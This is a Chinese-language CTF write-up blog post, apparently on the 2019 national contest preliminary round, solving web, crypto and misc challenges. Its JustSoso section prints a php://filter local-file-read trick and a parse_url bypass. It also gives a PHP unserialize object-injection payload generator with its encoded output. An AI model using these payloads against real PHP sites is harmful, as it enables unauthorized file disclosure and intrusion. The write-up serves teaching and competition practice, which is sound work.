      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;del&gt;我还是太懒了，已经半年没更新博客，跟个废人一样。&lt;/del&gt;这个学期要振作起来！ 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，&lt;strong&gt;下面附上队友大腿的WP&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://lzy-wi.github.io/2019/09/11/qiangwangbei-GD-writewp/#more&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;2019广东省强网杯writeup&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>国赛2019初赛部分WP</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/04/22/%E5%9B%BD%E8%B5%9B2019%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/04/22/国赛2019初赛部分WP/</id>
    <published>2019-04-22T07:09:28.000Z</published>
    <updated>2019-04-22T07:11:30.434Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h2><ol><li><p>?file=php://filter/read=convert.base64-encode/resource=hint.php</p><a id="more"></a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $handle;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle = $handle; </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token_flag;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>2+,ing</span><br></pre></td></tr></table></figure></li><li><p>?file=php://filter/read=convert.base64-encode/resource=index.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">"file"</span>]; </span></span><br><span class="line"><span class="php">$payload = $_GET[<span class="string">"payload"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@<span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span></span><br><span class="line"><span class="php">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    parse_str($url[<span class="string">'query'</span>],$query);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $payload = unserialize($payload);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Please get the source of hint.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>2+,ing</span><br></pre></td></tr></table></figure></li><li><p>payload这里执行了反序列操作，file变量填入hint.php将类文件导入进来，这里我们需要绕过parse_url，例如<a href="http://127.0.0.1///index.php" target="_blank" rel="noopener">http://127.0.0.1///index.php</a> 即可绕过从而执行payload</p></li><li>这里还有一个地方需要绕过：<blockquote><p>$this-&gt;token === $this-&gt;token_flag</p></blockquote></li><li>这里使用指针将其指为一个地址即可</li><li><p>构造payload</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">class Handle&#123;</span></span><br><span class="line"><span class="xml">    private $handle;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    public function __construct($handle) &#123;</span></span><br><span class="line"><span class="xml">        $this-&gt;handle = $handle;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    public function __destruct()&#123;</span></span><br><span class="line"><span class="xml">        $this-&gt;handle-&gt;getFlag();</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">class Flag&#123;</span></span><br><span class="line"><span class="xml">    public $file;</span></span><br><span class="line"><span class="xml">    function __construct($file)&#123;</span></span><br><span class="line"><span class="xml">        $this-&gt;file = $file;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    public function getFlag()&#123;</span></span><br><span class="line"><span class="xml">        if(isset($this-&gt;file))&#123;</span></span><br><span class="line"><span class="xml">            echo @highlight_file($this-&gt;file,true);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">$flag = new Flag('flag.php');</span></span><br><span class="line"><span class="xml">$flag -&gt;token = &amp;$flag -&gt; token_flag;</span></span><br><span class="line"><span class="xml">$exp = new Handle($flag);</span></span><br><span class="line"><span class="xml">echo urlencode(serialize($exp)).PHP_EOL;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">//O%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php</span></span><br><span class="line"><span class="xml"></span><span class="perl">%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D</span><span class="xml"></span></span><br></pre></td></tr></table></figure></li><li><p>还有一个地方需要绕过，绕过wakeup函数，实际上是1，我们将变量改为大于1即可绕过</p></li></ol><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="puzzles"><a href="#puzzles" class="headerlink" title="puzzles"></a>puzzles</h2><h3 id="question-0"><a href="#question-0" class="headerlink" title="question 0"></a>question 0</h3><p><img src="https://uploader.shimo.im/f/wXjE150u7LMqjLEf.png!thumbnail" alt=""><br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">a1:</span><span class="number">0xfa6</span></span><br><span class="line"><span class="symbol">a2:</span><span class="number">0xbed</span></span><br><span class="line"><span class="symbol">a3:</span><span class="number">0x9c7</span></span><br><span class="line"><span class="symbol">a4:</span><span class="number">0xa00</span></span><br></pre></td></tr></table></figure></p><h3 id="question-1"><a href="#question-1" class="headerlink" title="question 1"></a>question 1</h3><blockquote><p>26364809  Part1 26366033 26366621</p><ol><li>看到这三个数都是素数，猜想part1也可能是素数(并且相隔37)。google到如下的素数表<br><img src="https://uploader.shimo.im/f/XF5u0tmf5ykNuqMJ.png!thumbnail" alt=""><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">part1=<span class="number">26365399</span></span><br><span class="line">hex(<span class="number">26365399</span>)=<span class="number">0x1924dd7</span></span><br></pre></td></tr></table></figure></li></ol></blockquote><p>hex</p><h3 id="question-2"><a href="#question-2" class="headerlink" title="question 2"></a>question 2</h3><ol><li>没什么好说的，极限和定积分<br><a href="https://zh.numberempire.com/definiteintegralcalculator.php" target="_blank" rel="noopener">在线求解</a><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">part2=(<span class="number">1</span>+<span class="number">91</span>+<span class="number">7</span>+<span class="number">1</span>)*<span class="number">77</span>=<span class="number">7700</span></span><br><span class="line">hex(<span class="number">7700</span>)=<span class="number">0x1e14</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="question-3"><a href="#question-3" class="headerlink" title="question 3"></a>question 3</h3><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190422145032.png?raw=true" alt=""></p><blockquote><p>part3=0x48d0</p></blockquote><h3 id="question-4"><a href="#question-4" class="headerlink" title="question 4"></a>question 4</h3><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190422145340.png?raw=true" alt=""></p><blockquote><p>part4=hex(336pi*120/pi=40320)=0x9d806</p></blockquote><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ol><li>本题个是aes-ctr加密，但在同一次通信中其中的key和计数器不变,所以明文异或的密钥不会变.</li><li>所以需要在通信过程可以通过输入不同的填充获得密钥</li><li>AES_CTR 就是对明文分组做异或</li><li>输入：11111111111111111111111111111111111111111111111111111 (48+5 = 53个重复),得到密文分为6组分别为part1~part6</li><li>输入：11111 (5个重复),得到密文分为6组分别为No.1~No.3</li><li>代入即可求解<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s1=[<span class="string">"part1"</span>,<span class="string">"part2"</span>,<span class="string">"part3"</span>,<span class="string">"part4"</span>,<span class="string">"part5"</span>,<span class="string">"part6"</span>]</span><br><span class="line">s2=[<span class="string">"NO.1"</span>,<span class="string">"NO.2"</span>,<span class="string">"NO.3"</span>]</span><br><span class="line"><span class="attribute">ming</span>=<span class="string">"11111111111111111111111111111111111111111111111111111"</span></span><br><span class="line"><span class="attribute">minghex</span>=ming.encode("hex")</span><br><span class="line"><span class="builtin-name">print</span> minghex</span><br><span class="line"><span class="attribute">key1</span>=int(s1[0],16)^int(minghex,16)</span><br><span class="line"><span class="attribute">key2</span>=int(s1[1],16)^int(minghex,16)</span><br><span class="line"><span class="attribute">key3</span>=int(s1[2],16)^int(minghex,16)</span><br><span class="line"><span class="attribute">minghex0</span>=int(s2[0],16)^key1</span><br><span class="line"><span class="attribute">minghex1</span>=int(s2[1],16)^key2</span><br><span class="line"><span class="attribute">minghex2</span>=int(s2[2],16)^key3</span><br><span class="line"><span class="builtin-name">print</span> len(hex(key1))</span><br><span class="line"><span class="builtin-name">print</span> len(hex(key2))</span><br><span class="line"><span class="builtin-name">print</span> len(hex(key3))</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex0)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex1)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex2)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex0)[2:-1].decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex1)[2:-1].decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex2)[2:-1].decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Asymmetric"><a href="#Asymmetric" class="headerlink" title="Asymmetric"></a>Asymmetric</h2><ul><li>没什么好讲的，就一RSA的基本解法<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">N=754600786340927688096652328072061561501667781193760284816393637647032362908189628005150802929636396969230958922073774180726205402897453096041624408154494621307262657492560975357997726055874834308239749992507552325614973631556754707427580134609221878324704469965450463088892083264951442562525825243127575048386573246756312509362222667015490013299327398464802116909245529065994770788125182846841016932803939806558559335886481214931253578226314057242462834149031625361286317307273138514126289052003214703248070256059405676891634792175775697355408418965738663732479622148276007308404691800186837579126431484536836513358124181380166971922188839934522356902295160649189850427580493328509329115798694580347461641487270793993129066433242544366683131231903590153844590595882428219010673818765995719694470668924781499987923250883546686344997580959954960334567874040563037167422839228466141912000421309282727363913908613116739074234989825489075148091144771967111113068647060175231126374070143480727000247378471525286907200601035581143391602569836131345909055708005758380081303860198696570649330092070410465978479841469533490522594827330661914537170063053059393550673731195548189192109328158876774080143171304333338291909598353550442855717204721</span><br><span class="line"></span><br><span class="line">e=58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979</span><br><span class="line"></span><br><span class="line">phi=165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867**4-165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867**3</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">c=397664589731174185244807196969081295636743791347632992634877550171968202027583158122965358524605148382084087083055292775614950985582170471137600161892882032418551412966830769759927895880547815633951497722234770712306297076112879370771232002533504544337602525761984751743331880661186125346775270009628518533444304138475743540761869803954394981015216901027389649277312518044879870118578221153501921121767735420588646590238714924432821796920521634258142397614044689209502427096357648434975129259602082825127577076206003397304427079424477492861403400315663250325072548968845681025152851701569515687341859140204177488152275522562157702438579218042125793735027062228793066059121344460139665832155539640935735205492779952978907816559262061499244528361109871020021430760020031419798283808270133071565808900320433503202909269829912391264709602543303699123003147709062800113790217663557468058878220523200876377904766404202224175582491708673210826668402867922460431914279888880230599188839367957343839752438896262332473564984706656652754054197747324605372489970688044871961691577273950534597267097030840338786892644592482975063818909397183558108598420167691316258539257369739732052074157931998072754050437812781241004016365131849522113541913181</span><br><span class="line"></span><br><span class="line">print hex(pow(c,d,N))[2:].decode('hex')</span><br></pre></td></tr></table></figure></li></ul><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="saleae"><a href="#saleae" class="headerlink" title="saleae"></a>saleae</h2><ul><li>需要安装saleae logic工具然后导入文件<br><img src="https://uploader.shimo.im/f/6eHQwwUon9UGxPod.png!thumbnail" alt=""></li></ul><ol><li><p>一上一下为0，同上为1,和异或的思想一样。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01100110</span></span><br><span class="line"><span class="number">01101100</span></span><br><span class="line"><span class="number">01100001</span> </span><br><span class="line"><span class="number">01100111</span></span><br><span class="line"><span class="number">01111011</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00110010</span></span><br><span class="line"><span class="number">00110000</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00110011</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">01100100</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">00110100</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">01100101</span></span><br><span class="line"><span class="number">00110110</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">01100010</span></span><br><span class="line"><span class="number">01100101</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">01100011</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">00110100</span></span><br><span class="line"><span class="number">01100010</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">01100001</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">00110101</span></span><br><span class="line"><span class="number">01100101</span></span><br><span class="line"><span class="number">00110000</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">01111101</span></span><br></pre></td></tr></table></figure></li><li><p>二进制转字符即可</p></li></ol><h2 id="24C"><a href="#24C" class="headerlink" title="24C"></a>24C</h2><ol><li>saleae logic导入文件<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190422150328.png?raw=true" alt=""></li><li>选择I2C协议导出<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Time [s],Packet ID,Address,Data,Read/Write,ACK/NAK</span><br><span class="line"><span class="number">0.843872000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',' ',Write,ACK</span><br><span class="line"><span class="number">0.844038500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',f,Write,ACK</span><br><span class="line"><span class="number">0.844205000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">1</span>,Write,ACK</span><br><span class="line"><span class="number">0.844371000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">6</span>,Write,ACK</span><br><span class="line"><span class="number">0.844537500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">3</span>,Write,ACK</span><br><span class="line"><span class="number">0.844704000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',b,Write,ACK</span><br><span class="line"><span class="number">0.844870500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',d,Write,ACK</span><br><span class="line"><span class="number">0.845036500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',f,Write,ACK</span><br><span class="line"><span class="number">0.845203000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">4</span>,Write,ACK</span><br><span class="line"><span class="number">0.845369500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',e,Write,ACK</span><br><span class="line"><span class="number">0.845536000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',&#125;,Write,ACK</span><br><span class="line"><span class="number">0.845702500000000</span>,<span class="number">0</span>,'<span class="number">160</span>','<span class="number">0</span>',Write,ACK</span><br><span class="line"><span class="number">0.945962500000000</span>,<span class="number">1</span>,'<span class="number">160</span>','<span class="number">0</span>',Write,ACK</span><br><span class="line"><span class="number">0.946318000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',f,Read,ACK</span><br><span class="line"><span class="number">0.946481500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',l,Read,ACK</span><br><span class="line"><span class="number">0.946645000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',a,Read,ACK</span><br><span class="line"><span class="number">0.946808500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',g,Read,ACK</span><br><span class="line"><span class="number">0.946972000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',&#123;,Read,ACK</span><br><span class="line"><span class="number">0.947135500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',c,Read,ACK</span><br><span class="line"><span class="number">0.947299500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">4</span>,Read,ACK</span><br><span class="line"><span class="number">0.947463000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">6</span>,Read,ACK</span><br><span class="line"><span class="number">0.947626500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',d,Read,ACK</span><br><span class="line"><span class="number">0.947790000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">9</span>,Read,ACK</span><br><span class="line"><span class="number">0.947953500000000</span>,<span class="number">2</span>,'<span 